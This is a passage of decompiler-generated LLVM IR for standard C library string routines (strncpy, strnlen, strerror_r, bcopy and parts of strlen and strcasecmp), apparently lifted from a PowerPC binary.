  %v1_10004ec8 = add i32 %v2_10004eb8, -16843009
  %v2_10004ecc = and i32 %v1_10004ec8, -2139062144
  %v5_10004ecc = icmp eq i32 %v2_10004ecc, 0
  br i1 %v5_10004ecc, label %dec_label_pc_10004eb8, label %dec_label_pc_10004ed4

dec_label_pc_10004ed4:                            ; preds = %dec_label_pc_10004eb8
  %v2_10004ed4 = inttoptr i32 %v1_10004ef4 to i8*
  %v3_10004ed4 = load i8, i8* %v2_10004ed4, align 1
  %v3_10004ed8 = icmp eq i8 %v3_10004ed4, 0
  br i1 %v3_10004ed8, label %dec_label_pc_10004ee0, label %dec_label_pc_10004ee8

dec_label_pc_10004ee0:                            ; preds = %dec_label_pc_10004e94, %dec_label_pc_10004ed4
  %v1_10004ee0 = phi i32 [ %v1_10004ef4, %dec_label_pc_10004ed4 ], [ %v0_10004ea0, %dec_label_pc_10004e94 ]
  %v2_10004ee0 = sub i32 %v1_10004ee0, %v0_10004e8c
  ret i32 %v2_10004ee0

dec_label_pc_10004ee8:                            ; preds = %dec_label_pc_10004ed4
  %v1_10004ee8 = add i32 %v1_10004ef4, 1
  %v2_10004ee8 = inttoptr i32 %v1_10004ee8 to i8*
  %v3_10004ee8 = load i8, i8* %v2_10004ee8, align 1
  %v3_10004eec = icmp eq i8 %v3_10004ee8, 0
  br i1 %v3_10004eec, label %dec_label_pc_10004ef4, label %dec_label_pc_10004f00

dec_label_pc_10004ef4:                            ; preds = %dec_label_pc_10004ee8
  %v2_10004ef4 = sub i32 %v1_10004ef4, %v0_10004e8c
  %v1_10004ef8 = add i32 %v2_10004ef4, 1
  ret i32 %v1_10004ef8

dec_label_pc_10004f00:                            ; preds = %dec_label_pc_10004ee8
  %v1_10004f00 = add i32 %v1_10004ef4, 2
  %v2_10004f00 = inttoptr i32 %v1_10004f00 to i8*
  %v3_10004f00 = load i8, i8* %v2_10004f00, align 1
  %v3_10004f04 = icmp eq i8 %v3_10004f00, 0
  br i1 %v3_10004f04, label %dec_label_pc_10004f0c, label %dec_label_pc_10004f18

dec_label_pc_10004f0c:                            ; preds = %dec_label_pc_10004f00
  %v2_10004f0c = sub i32 %v1_10004ef4, %v0_10004e8c
  %v1_10004f10 = add i32 %v2_10004f0c, 2
  ret i32 %v1_10004f10

dec_label_pc_10004f18:                            ; preds = %dec_label_pc_10004f00
  %v1_10004f18 = add i32 %v1_10004ef4, 3
  %v2_10004f18 = inttoptr i32 %v1_10004f18 to i8*
  %v3_10004f18 = load i8, i8* %v2_10004f18, align 1
  %v3_10004f1c = icmp eq i8 %v3_10004f18, 0
  br i1 %v3_10004f1c, label %dec_label_pc_10004f24, label %dec_label_pc_10004eb8

dec_label_pc_10004f24:                            ; preds = %dec_label_pc_10004f18
  %v2_10004f24 = sub i32 %v1_10004ef4, %v0_10004e8c
  %v1_10004f28 = add i32 %v2_10004f24, 3
  ret i32 %v1_10004f28

; uselistorder directives
  uselistorder i32 %v1_10004ebc, { 1, 0 }
  uselistorder i32 %v1_10004ef4, { 3, 4, 2, 5, 1, 6, 0, 7, 9, 8 }
  uselistorder i32 %v1_10004ea0, { 1, 0, 2 }
  uselistorder i32 %v0_10004e8c, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10004ee0, { 1, 0 }
  uselistorder label %dec_label_pc_10004e94, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v3_10004f30 = icmp eq i32 %arg2, 3
  store i1 %v3_10004f30, i1* %cr7_eq.global-to-local, align 1
  %v1_10004f34 = add i32 %arg1, -1
  store i32 %v1_10004f34, i32* %r10.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_10004fb0, label %dec_label_pc_10004f3c

dec_label_pc_10004f3c:                            ; preds = %entry
  %v1_10004f3c = udiv i32 %arg2, 4
  store i32 %v1_10004f3c, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10004f44

dec_label_pc_10004f44:                            ; preds = %dec_label_pc_10004f94, %dec_label_pc_10004f3c
  %v2_10004f54 = phi i32 [ %v3_10004f8c, %dec_label_pc_10004f94 ], [ %v1_10004f34, %dec_label_pc_10004f3c ]
  %v0_10004f44 = load i32, i32* @r4, align 4
  %v1_10004f44 = inttoptr i32 %v0_10004f44 to i8*
  %v2_10004f44 = load i8, i8* %v1_10004f44, align 1
  %v1_10004f48 = add i32 %v0_10004f44, 1
  store i32 %v1_10004f48, i32* %r11.global-to-local, align 4
  %v1_10004f4c = add i32 %v0_10004f44, 2
  store i32 %v1_10004f4c, i32* %r8.global-to-local, align 4
  %v3_10004f50 = icmp eq i8 %v2_10004f44, 0
  store i1 %v3_10004f50, i1* %cr7_eq.global-to-local, align 1
  %v3_10004f54 = add i32 %v2_10004f54, 1
  %v4_10004f54 = inttoptr i32 %v3_10004f54 to i8*
  store i8 %v2_10004f44, i8* %v4_10004f54, align 1
  store i32 %v3_10004f54, i32* %r10.global-to-local, align 4
  %v0_10004f58 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004f58, label %dec_label_pc_10004f9c, label %dec_label_pc_10004f5c

dec_label_pc_10004f5c:                            ; preds = %dec_label_pc_10004f44
  %v0_10004f5c = load i32, i32* @r4, align 4
  %v1_10004f5c = add i32 %v0_10004f5c, 1
  %v2_10004f5c = inttoptr i32 %v1_10004f5c to i8*
  %v3_10004f5c = load i8, i8* %v2_10004f5c, align 1
  %v0_10004f60 = load i32, i32* %r8.global-to-local, align 4
  %v1_10004f64 = add i32 %v0_10004f60, 2
  store i32 %v1_10004f64, i32* @r4, align 4
  %v3_10004f68 = icmp eq i8 %v3_10004f5c, 0
  store i1 %v3_10004f68, i1* %cr7_eq.global-to-local, align 1
  %v3_10004f6c = add i32 %v2_10004f54, 2
  %v4_10004f6c = inttoptr i32 %v3_10004f6c to i8*
  store i8 %v3_10004f5c, i8* %v4_10004f6c, align 1
  store i32 %v3_10004f6c, i32* %r10.global-to-local, align 4
  %v0_10004f70 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004f70, label %dec_label_pc_10004f9c, label %dec_label_pc_10004f74

dec_label_pc_10004f74:                            ; preds = %dec_label_pc_10004f5c
  %v0_10004f74 = load i32, i32* %r11.global-to-local, align 4
  %v1_10004f74 = add i32 %v0_10004f74, 1
  %v2_10004f74 = inttoptr i32 %v1_10004f74 to i8*
  %v3_10004f74 = load i8, i8* %v2_10004f74, align 1
  %v3_10004f78 = icmp eq i8 %v3_10004f74, 0
  store i1 %v3_10004f78, i1* %cr7_eq.global-to-local, align 1
  %v3_10004f7c = add i32 %v2_10004f54, 3
  %v4_10004f7c = inttoptr i32 %v3_10004f7c to i8*
  store i8 %v3_10004f74, i8* %v4_10004f7c, align 1
  store i32 %v3_10004f7c, i32* %r10.global-to-local, align 4
  %v0_10004f80 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004f80, label %dec_label_pc_10004f9c, label %dec_label_pc_10004f84

dec_label_pc_10004f84:                            ; preds = %dec_label_pc_10004f74
  %v0_10004f84 = load i32, i32* %r8.global-to-local, align 4
  %v1_10004f84 = add i32 %v0_10004f84, 1
  %v2_10004f84 = inttoptr i32 %v1_10004f84 to i8*
  %v3_10004f84 = load i8, i8* %v2_10004f84, align 1
  %v3_10004f88 = icmp eq i8 %v3_10004f84, 0
  store i1 %v3_10004f88, i1* %cr7_eq.global-to-local, align 1
  %v3_10004f8c = add i32 %v2_10004f54, 4
  %v4_10004f8c = inttoptr i32 %v3_10004f8c to i8*
  store i8 %v3_10004f84, i8* %v4_10004f8c, align 1
  store i32 %v3_10004f8c, i32* %r10.global-to-local, align 4
  %v0_10004f90 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004f90, label %dec_label_pc_10004f9c, label %dec_label_pc_10004f94

dec_label_pc_10004f94:                            ; preds = %dec_label_pc_10004f84
  %v0_10004f94 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10004f94 = add i32 %v0_10004f94, -1
  store i32 %v1_10004f94, i32* %ctr.global-to-local, align 4
  %v2_10004f94 = icmp eq i32 %v1_10004f94, 0
  br i1 %v2_10004f94, label %dec_label_pc_10004fb0, label %dec_label_pc_10004f44

dec_label_pc_10004f9c:                            ; preds = %dec_label_pc_10004f84, %dec_label_pc_10004f74, %dec_label_pc_10004f5c, %dec_label_pc_10004f44
  %v1_10004f9c = phi i32 [ %v3_10004f8c, %dec_label_pc_10004f84 ], [ %v3_10004f7c, %dec_label_pc_10004f74 ], [ %v3_10004f6c, %dec_label_pc_10004f5c ], [ %v3_10004f54, %dec_label_pc_10004f44 ]
  %v2_10004f9c11 = sub i32 %arg1, %v1_10004f9c
  %v2_10004fa0 = add i32 %v2_10004f9c11, %arg2
  %v1_10004fa4 = add i32 %v2_10004fa0, -1
  store i32 %v1_10004fa4, i32* %r11.global-to-local, align 4
  %v4_10004fa4 = icmp eq i32 %v1_10004fa4, 0
  %v0_10004fa8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10004fa4, i32 %v0_10004fa8)
  %v2_10004fe0.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10004fd8

dec_label_pc_10004fb0:                            ; preds = %dec_label_pc_10004f94, %entry
  %v1_10004fb0 = urem i32 %arg2, 4
  store i32 %v1_10004fb0, i32* %r11.global-to-local, align 4
  %v3_10004fb0 = icmp eq i32 %v1_10004fb0, 0
  %v0_10004fb4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10004fb0, i32 %v0_10004fb4)
  store i32 %v1_10004fb0, i32* %ctr.global-to-local, align 4
  %v2_10004fcc.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10004fbc

dec_label_pc_10004fbc:                            ; preds = %dec_label_pc_10004fd4.dec_label_pc_10004fbc_crit_edge, %dec_label_pc_10004fb0
  %v2_10004fcc = phi i32 [ %v3_10004fcc, %dec_label_pc_10004fd4.dec_label_pc_10004fbc_crit_edge ], [ %v2_10004fcc.pre, %dec_label_pc_10004fb0 ]
  %v0_10004fc0 = phi i32 [ %v0_10004fc0.pre, %dec_label_pc_10004fd4.dec_label_pc_10004fbc_crit_edge ], [ %v1_10004fb0, %dec_label_pc_10004fb0 ]
  %v0_10004fbc = load i32, i32* @r4, align 4
  %v1_10004fbc = inttoptr i32 %v0_10004fbc to i8*
  %v2_10004fbc = load i8, i8* %v1_10004fbc, align 1
  %v1_10004fc0 = add i32 %v0_10004fc0, -1
  store i32 %v1_10004fc0, i32* %r11.global-to-local, align 4
  %v1_10004fc4 = add i32 %v0_10004fbc, 1
  store i32 %v1_10004fc4, i32* @r4, align 4
  %v3_10004fc8 = icmp eq i8 %v2_10004fbc, 0
  store i1 %v3_10004fc8, i1* %cr7_eq.global-to-local, align 1
  %v3_10004fcc = add i32 %v2_10004fcc, 1
  %v4_10004fcc = inttoptr i32 %v3_10004fcc to i8*
  store i8 %v2_10004fbc, i8* %v4_10004fcc, align 1
  store i32 %v3_10004fcc, i32* %r10.global-to-local, align 4
  %v0_10004fd0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10004fd0 = add i32 %v0_10004fd0, -1
  store i32 %v1_10004fd0, i32* %ctr.global-to-local, align 4
  %v2_10004fd0 = icmp eq i32 %v1_10004fd0, 0
  br i1 %v2_10004fd0, label %dec_label_pc_10004fe8, label %dec_label_pc_10004fd4

dec_label_pc_10004fd4:                            ; preds = %dec_label_pc_10004fbc
  %v0_10004fd4 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10004fd4, label %dec_label_pc_10004fd8, label %dec_label_pc_10004fd4.dec_label_pc_10004fbc_crit_edge

dec_label_pc_10004fd4.dec_label_pc_10004fbc_crit_edge: ; preds = %dec_label_pc_10004fd4
  %v0_10004fc0.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10004fbc

dec_label_pc_10004fd8:                            ; preds = %dec_label_pc_10004fd4, %dec_label_pc_10004f9c
  %v2_10004fe0.pre = phi i32 [ %v2_10004fe0.pre.pre, %dec_label_pc_10004f9c ], [ %v3_10004fcc, %dec_label_pc_10004fd4 ]
  %v0_10004fd8 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10004fd8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10004fdc

dec_label_pc_10004fdc:                            ; preds = %dec_label_pc_10004fdc, %dec_label_pc_10004fd8
  %v2_10004fe0 = phi i32 [ %v3_10004fe0, %dec_label_pc_10004fdc ], [ %v2_10004fe0.pre, %dec_label_pc_10004fd8 ]
  %v3_10004fe0 = add i32 %v2_10004fe0, 1
  %v4_10004fe0 = inttoptr i32 %v3_10004fe0 to i8*
  store i8 0, i8* %v4_10004fe0, align 1
  store i32 %v3_10004fe0, i32* %r10.global-to-local, align 4
  %v0_10004fe4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10004fe4 = add i32 %v0_10004fe4, -1
  store i32 %v1_10004fe4, i32* %ctr.global-to-local, align 4
  %v2_10004fe4 = icmp eq i32 %v1_10004fe4, 0
  br i1 %v2_10004fe4, label %dec_label_pc_10004fe8, label %dec_label_pc_10004fdc

dec_label_pc_10004fe8:                            ; preds = %dec_label_pc_10004fbc, %dec_label_pc_10004fdc
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_10004fe4, { 1, 0 }
  uselistorder i32 %v3_10004fe0, { 1, 2, 0 }
  uselistorder i32 %v1_10004fd0, { 1, 0 }
  uselistorder i32 %v3_10004fcc, { 0, 2, 3, 1 }
  uselistorder i32 %v1_10004fb0, { 1, 0, 3, 2 }
  uselistorder i32 %v1_10004f94, { 1, 0 }
  uselistorder i32 %v3_10004f8c, { 0, 2, 3, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 1, 2, 4, 5, 6 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 7, 5, 2, 3, 4, 6, 8 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10004fe8, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_10004fec = load i32, i32* @r4, align 4
  %v3_10004fec = icmp eq i32 %v0_10004fec, 0
  %v0_10004ff8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10004fec, i32 %v0_10004ff8)
  %v1_10005008 = load i32, i32* @r4, align 4
  %v2_10005008 = add i32 %v1_10005008, %tmp
  %v3_1000500c = icmp ugt i32 %v2_10005008, %tmp
  %v4_1000500c = icmp eq i32 %v1_10005008, 0
  %v2_10005010 = or i1 %v4_1000500c, %v3_1000500c
  br i1 %v2_10005010, label %dec_label_pc_10005018, label %dec_label_pc_10005014

dec_label_pc_10005000:                            ; preds = %dec_label_pc_10005080
  br label %dec_label_pc_100050c4

dec_label_pc_10005014:                            ; preds = %entry
  br label %dec_label_pc_10005018

dec_label_pc_10005018:                            ; preds = %entry, %dec_label_pc_10005014
  %v0_100050c8 = phi i32 [ %v2_10005008, %entry ], [ -1, %dec_label_pc_10005014 ]
  %v1_100050486 = urem i32 %tmp, 4
  %v3_100050488 = icmp eq i32 %v1_100050486, 0
  br i1 %v3_100050488, label %dec_label_pc_10005050, label %dec_label_pc_10005020

dec_label_pc_10005020:                            ; preds = %dec_label_pc_10005018, %dec_label_pc_10005044
  %v0_10005038 = phi i32 [ %v1_10005044, %dec_label_pc_10005044 ], [ %tmp, %dec_label_pc_10005018 ]
  %v1_10005020 = inttoptr i32 %v0_10005038 to i8*
  %v2_10005020 = load i8, i8* %v1_10005020, align 1
  %v3_10005024 = icmp eq i8 %v2_10005020, 0
  br i1 %v3_10005024, label %dec_label_pc_1000502c, label %dec_label_pc_10005044

dec_label_pc_1000502c:                            ; preds = %dec_label_pc_10005020
  %v3_1000502c = icmp ugt i32 %v0_100050c8, %v0_10005038
  %v0_10005038.v0_100050c8 = select i1 %v3_1000502c, i32 %v0_10005038, i32 %v0_100050c8
  %v2_1000503c = sub i32 %v0_10005038.v0_100050c8, %tmp
  ret i32 %v2_1000503c

dec_label_pc_10005044:                            ; preds = %dec_label_pc_10005020
  %v1_10005044 = add i32 %v0_10005038, 1
  %v1_10005048 = urem i32 %v1_10005044, 4
  %v3_10005048 = icmp eq i32 %v1_10005048, 0
  br i1 %v3_10005048, label %dec_label_pc_10005050, label %dec_label_pc_10005020

dec_label_pc_10005050:                            ; preds = %dec_label_pc_10005044, %dec_label_pc_10005018
  %v0_10005054 = phi i32 [ %tmp, %dec_label_pc_10005018 ], [ %v1_10005044, %dec_label_pc_10005044 ]
  %v2_100050bc3 = icmp ult i32 %v0_10005054, %v0_100050c8
  br i1 %v2_100050bc3, label %dec_label_pc_10005060, label %dec_label_pc_100050c4

dec_label_pc_10005060:                            ; preds = %dec_label_pc_10005050, %dec_label_pc_100050b8
  %v0_10005000 = phi i32 [ %v1_10005064, %dec_label_pc_100050b8 ], [ %v0_10005054, %dec_label_pc_10005050 ]
  %v1_10005060 = inttoptr i32 %v0_10005000 to i32*
  %v2_10005060 = load i32, i32* %v1_10005060, align 4
  %v1_10005064 = add i32 %v0_10005000, 4
  store i32 %v0_10005000, i32* @r7, align 4
  %v1_1000506c = add i32 %v0_10005000, 1
  %v1_10005074 = add i32 %v2_10005060, -16843009
  %v2_10005078 = and i32 %v1_10005074, -2139062144
  %v5_10005078 = icmp eq i32 %v2_10005078, 0
  br i1 %v5_10005078, label %dec_label_pc_100050b8, label %dec_label_pc_10005080

dec_label_pc_10005080:                            ; preds = %dec_label_pc_10005060
  %v2_10005080 = inttoptr i32 %v0_10005000 to i8*
  %v3_10005080 = load i8, i8* %v2_10005080, align 1
  %v3_10005084 = icmp eq i8 %v3_10005080, 0
  br i1 %v3_10005084, label %dec_label_pc_10005000, label %dec_label_pc_1000508c

dec_label_pc_1000508c:                            ; preds = %dec_label_pc_10005080
  %v2_1000508c = inttoptr i32 %v1_1000506c to i8*
  %v3_1000508c = load i8, i8* %v2_1000508c, align 1
  %v3_10005090 = icmp eq i8 %v3_1000508c, 0
  br i1 %v3_10005090, label %dec_label_pc_100050c4, label %dec_label_pc_10005098

dec_label_pc_10005098:                            ; preds = %dec_label_pc_1000508c
  %v1_10005098 = add i32 %v0_10005000, 2
  %v2_10005098 = inttoptr i32 %v1_10005098 to i8*
  %v3_10005098 = load i8, i8* %v2_10005098, align 1
  %v3_100050a0 = icmp eq i8 %v3_10005098, 0
  br i1 %v3_100050a0, label %dec_label_pc_100050c4, label %dec_label_pc_100050a8

dec_label_pc_100050a8:                            ; preds = %dec_label_pc_10005098
  %v1_100050a8 = add i32 %v0_10005000, 3
  %v2_100050a8 = inttoptr i32 %v1_100050a8 to i8*
  %v3_100050a8 = load i8, i8* %v2_100050a8, align 1
  %v3_100050b0 = icmp eq i8 %v3_100050a8, 0
  br i1 %v3_100050b0, label %dec_label_pc_100050c4, label %dec_label_pc_100050b8

dec_label_pc_100050b8:                            ; preds = %dec_label_pc_100050a8, %dec_label_pc_10005060
  %v2_100050bc = icmp ult i32 %v1_10005064, %v0_100050c8
  br i1 %v2_100050bc, label %dec_label_pc_10005060, label %dec_label_pc_100050c4

dec_label_pc_100050c4:                            ; preds = %dec_label_pc_100050b8, %dec_label_pc_1000508c, %dec_label_pc_10005098, %dec_label_pc_100050a8, %dec_label_pc_10005050, %dec_label_pc_10005000
  %v0_100050d0 = phi i32 [ %v0_10005000, %dec_label_pc_10005000 ], [ %v0_10005054, %dec_label_pc_10005050 ], [ %v1_100050a8, %dec_label_pc_100050a8 ], [ %v1_10005098, %dec_label_pc_10005098 ], [ %v1_1000506c, %dec_label_pc_1000508c ], [ %v0_100050c8, %dec_label_pc_100050b8 ]
  %v3_100050c4 = icmp ugt i32 %v0_100050c8, %v0_100050d0
  %v0_100050d0.v0_100050c8 = select i1 %v3_100050c4, i32 %v0_100050d0, i32 %v0_100050c8
  %v2_100050d4 = sub i32 %v0_100050d0.v0_100050c8, %tmp
  ret i32 %v2_100050d4

; uselistorder directives
  uselistorder i32 %v1_10005064, { 1, 0 }
  uselistorder i32 %v0_10005000, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v0_10005054, { 1, 0, 2 }
  uselistorder i32 %v1_10005044, { 1, 0, 2 }
  uselistorder i32 %v0_10005038, { 2, 0, 1, 3 }
  uselistorder i32 %v0_100050c8, { 1, 4, 0, 3, 5, 2, 6 }
  uselistorder i32 %v1_10005008, { 1, 0 }
  uselistorder i32 %tmp, { 2, 3, 1, 5, 6, 0, 4 }
  uselistorder label %dec_label_pc_100050c4, { 0, 3, 2, 1, 4, 5 }
  uselistorder label %dec_label_pc_10005060, { 1, 0 }
  uselistorder label %dec_label_pc_10005020, { 1, 0 }
  uselistorder label %dec_label_pc_10005018, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  store i32 268456180, i32* @lr, align 4
  %v0_100050f0 = call i32 @__xpg_strerror_r()
  %v0_100050f8 = load i32, i32* @r29, align 4
  ret i32 %v0_100050f8
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-39 = alloca i32, align 4
  %v0_10005114 = load i32, i32* @r3, align 4
  %v2_10005114 = icmp ugt i32 %v0_10005114, 124
  %v0_1000511c = load i32, i32* @r4, align 4
  store i32 %v0_1000511c, i32* %r27.global-to-local, align 4
  %v0_10005124 = load i32, i32* @r5, align 4
  br i1 %v2_10005114, label %dec_label_pc_10005168, label %dec_label_pc_1000512c

dec_label_pc_1000512c:                            ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_1000bd84.379 to i32), i32* %r30.global-to-local, align 4
  %v3_100051504 = icmp eq i32 %v0_10005114, 0
  br i1 %v3_100051504, label %dec_label_pc_1000515c, label %dec_label_pc_1000513c

dec_label_pc_1000513c:                            ; preds = %dec_label_pc_1000512c, %dec_label_pc_1000513c
  %v0_10005140 = phi i32 [ %v1_10005140, %dec_label_pc_1000513c ], [ ptrtoint ([8 x i8]* @global_var_1000bd84.379 to i32), %dec_label_pc_1000512c ]
  %v1_10005140 = add i32 %v0_10005140, 1
  store i32 %v1_10005140, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000513c

dec_label_pc_1000515c:                            ; preds = %dec_label_pc_1000512c
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_1000519c

dec_label_pc_10005168:                            ; preds = %entry
  %tmp = icmp slt i32 %v0_10005114, 0
  %v1_1000516c = zext i1 %tmp to i32
  %v2_1000516c = ashr i32 %v0_10005114, 31
  %v3_1000516c = and i32 %v2_1000516c, -2
  %v4_1000516c = or i32 %v3_1000516c, %v1_1000516c
  store i32 22, i32* %r28.global-to-local, align 4
  %v5_10005180 = bitcast i32* %stack_var_-39 to i8*
  %v6_10005180 = call i32 @_uintmaxtostr(i8* %v5_10005180, i32 %v4_1000516c, i32 %v0_10005114, i32 -10, i32 0)
  %v1_10005188 = add i32 %v6_10005180, -14
  store i32 %v1_10005188, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1000bd74.380 to i32), i32* @r4, align 4
  store i32 %v1_10005188, i32* @r3, align 4
  store i32 14, i32* @r5, align 4
  store i32 268456348, i32* @lr, align 4
  %v0_10005198 = call i32 @memcpy()
  %v0_1000519c.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_100051a0.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_100051b0.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000519c

dec_label_pc_1000519c:                            ; preds = %dec_label_pc_1000515c, %dec_label_pc_10005168
  %v0_100051b0 = phi i32 [ %v0_10005124, %dec_label_pc_1000515c ], [ %v0_100051b0.pre, %dec_label_pc_10005168 ]
  %v0_100051a0 = phi i32 [ ptrtoint ([8 x i8]* @global_var_1000bd84.379 to i32), %dec_label_pc_1000515c ], [ %v0_100051a0.pre, %dec_label_pc_10005168 ]
  %v1_100051a4 = phi i32 [ %v0_1000511c, %dec_label_pc_1000515c ], [ %v0_1000519c.pre, %dec_label_pc_10005168 ]
  %tmp21 = icmp slt i32 %v1_100051a4, 0
  %v1_1000519c = zext i1 %tmp21 to i32
  %v2_1000519c = ashr i32 %v1_100051a4, 31
  %v3_1000519c = and i32 %v2_1000519c, -2
  %v4_1000519c = or i32 %v3_1000519c, %v1_1000519c
  store i32 %v0_100051a0, i32* @r3, align 4
  %v2_100051a4 = xor i32 %v4_1000519c, %v1_100051a4
  %v2_100051a8 = sub i32 %v4_1000519c, %v2_100051a4
  %tmp22 = icmp slt i32 %v2_100051a8, 0
  %v1_100051ac = zext i1 %tmp22 to i32
  %v2_100051ac = ashr i32 %v2_100051a8, 31
  %v3_100051ac = and i32 %v2_100051ac, -2
  %v4_100051ac = or i32 %v3_100051ac, %v1_100051ac
  %v2_100051b0 = and i32 %v4_100051ac, %v0_100051b0
  store i32 %v2_100051b0, i32* @r29, align 4
  %v0_100051b4 = call i32 @__GI_strlen()
  %v1_100051b8 = add i32 %v0_100051b4, 1
  store i32 %v1_100051b8, i32* %r31.global-to-local, align 4
  %v1_100051bc = load i32, i32* @r29, align 4
  %v3_100051bc = icmp ugt i32 %v1_100051b8, %v1_100051bc
  br i1 %v3_100051bc, label %dec_label_pc_100051c4, label %dec_label_pc_100051cc

dec_label_pc_100051c4:                            ; preds = %dec_label_pc_1000519c
  store i32 %v1_100051bc, i32* %r31.global-to-local, align 4
  store i32 34, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_100051cc

dec_label_pc_100051cc:                            ; preds = %dec_label_pc_1000519c, %dec_label_pc_100051c4
  %v0_100051dc = phi i32 [ %v1_100051bc, %dec_label_pc_100051c4 ], [ %v1_100051b8, %dec_label_pc_1000519c ]
  %v3_100051cc = icmp eq i32 %v0_100051dc, 0
  br i1 %v3_100051cc, label %dec_label_pc_100051f0, label %dec_label_pc_100051d4

dec_label_pc_100051d4:                            ; preds = %dec_label_pc_100051cc
  %v0_100051d4 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_100051d4, i32* @r4, align 4
  %v0_100051d8 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_100051d8, i32* @r3, align 4
  store i32 %v0_100051dc, i32* @r5, align 4
  store i32 268456420, i32* @lr, align 4
  %v0_100051e0 = call i32 @memcpy()
  %v1_100051e4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100051e4 = add i32 %v1_100051e4, %v0_100051d8
  %v3_100051ec = add i32 %v2_100051e4, -1
  %v4_100051ec = inttoptr i32 %v3_100051ec to i8*
  store i8 0, i8* %v4_100051ec, align 1
  br label %dec_label_pc_100051f0

dec_label_pc_100051f0:                            ; preds = %dec_label_pc_100051cc, %dec_label_pc_100051d4
  %v0_100051f0 = load i32, i32* %r28.global-to-local, align 4
  %v3_100051f0 = icmp eq i32 %v0_100051f0, 0
  br i1 %v3_100051f0, label %dec_label_pc_10005200, label %dec_label_pc_100051f8

dec_label_pc_100051f8:                            ; preds = %dec_label_pc_100051f0
  %v0_100051f8 = call i32 @__errno_location()
  %v0_100051fc = load i32, i32* %r28.global-to-local, align 4
  %v2_100051fc = inttoptr i32 %v0_100051f8 to i32*
  store i32 %v0_100051fc, i32* %v2_100051fc, align 4
  %v0_10005204.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10005200

dec_label_pc_10005200:                            ; preds = %dec_label_pc_100051f0, %dec_label_pc_100051f8
  %v0_10005204 = phi i32 [ 0, %dec_label_pc_100051f0 ], [ %v0_10005204.pre, %dec_label_pc_100051f8 ]
  ret i32 %v0_10005204

; uselistorder directives
  uselistorder i32 %v2_100051a8, { 1, 0 }
  uselistorder i32 %v4_1000519c, { 1, 0 }
  uselistorder i32 %v1_100051a4, { 1, 2, 0 }
  uselistorder i32 %v1_10005140, { 1, 0 }
  uselistorder i32 %v0_10005114, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r30.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r28.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 1, 0 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_1000bd84.379 to i32), { 1, 0, 2 }
  uselistorder label %dec_label_pc_10005200, { 1, 0 }
  uselistorder label %dec_label_pc_100051f0, { 1, 0 }
  uselistorder label %dec_label_pc_100051cc, { 1, 0 }
  uselistorder label %dec_label_pc_1000519c, { 1, 0 }
  uselistorder label %dec_label_pc_1000513c, { 1, 0 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_10005224 = call i32 @memmove(i32 %arg2, i32 %arg1)
  ret i32 %v2_10005224
}

define i32 @__GI_strcasecmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
